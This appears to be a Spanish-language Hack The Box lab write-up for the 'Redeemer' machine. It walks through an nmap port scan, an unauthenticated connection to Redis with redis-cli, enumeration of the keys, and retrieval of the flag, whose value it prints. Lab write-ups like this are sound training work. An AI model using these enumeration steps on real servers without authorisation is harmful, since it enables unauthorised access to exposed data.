+++
title = "Redeemer"
description = "Máquina de Starting Point enfocada en la enumeración de servicios y el acceso mediante Redis."

platform = "HackTheBox"
OS = "Linux"
difficulty = "Very-Easy"

tags = [
"Redis",
"Enumeration",
"Starting Point",
"Foundations"
]

image = "/images/writeups/redeemer.png"
+++

### Descripción general

**Redeemer** es una máquina perteneciente a **Starting Point** de Hack The Box. Está diseñada para practicar conceptos fundamentales de enumeración de servicios y acceso a bases de datos mediante Redis.

El objetivo consiste en identificar el servicio Redis expuesto, conectarse al servidor y enumerar las claves almacenadas para obtener la bandera.

---

### Enumeración

Comenzamos realizando un escaneo completo de puertos con **Nmap**:

```bash
sudo nmap -p- -sS --min-rate 5000 -T4 -Pn <TARGET_IP>
```

El escaneo muestra un único puerto abierto:

```text
PORT     STATE SERVICE
6379/tcp open  redis
```

El puerto `6379/tcp` corresponde al servicio **Redis**, por lo que procedemos a investigar el servicio.

---

### Acceso inicial

Utilizamos `redis-cli` especificando la dirección IP del objetivo:

```bash
redis-cli -h <TARGET_IP>
```

La conexión se establece correctamente:

```text
<TARGET_IP>:6379>
```

Una vez dentro, consultamos la información del servidor mediante el comando `info`:

```bash
info
```

Entre la información obtenida podemos identificar la versión de Redis:

```text
redis_version:5.0.7
```

También podemos confirmar que el servidor utiliza **Linux**:

```text
os:Linux 5.4.0-77-generic x86_64
```

Continuamos con la enumeración de la base de datos seleccionando la base de datos `0`:

```bash
SELECT 0
```

Redis confirma que la operación se realizó correctamente:

```text
OK
```

Enumeramos las claves almacenadas utilizando:

```bash
KEYS *
```

El servidor devuelve cuatro claves:

```text
1) "temp"
2) "flag"
3) "numb"
4) "stor"
```

La clave `flag` resulta especialmente interesante, por lo que procedemos a consultarla.

---

### Bandera

Consultamos el contenido de la clave `flag` mediante el comando `GET`:

```bash
GET flag
```

Redis devuelve el valor almacenado:

```text
"03e1d2b376c37ab3f5319922053953eb"
```

Con esto obtenemos la bandera y se completa la máquina **Redeemer**.

---

### Conclusión

**Redeemer** presenta un escenario sencillo basado principalmente en la enumeración de servicios y el acceso a una instancia de Redis expuesta.

El proceso seguido fue:

```text
Enumeración
    ↓
Identificación del puerto 6379
    ↓
Detección de Redis
    ↓
Conexión mediante redis-cli
    ↓
Enumeración de la base de datos
    ↓
Identificación de la clave flag
    ↓
Obtención de la bandera
```

A pesar de su dificultad **Very Easy**, la máquina permite reforzar la importancia de identificar correctamente los servicios expuestos y comprender cómo interactuar con ellos para localizar información disponible en el sistema.

---

### [Estado: Completada](https://labs.hackthebox.com/achievement/machine/3933963/472)

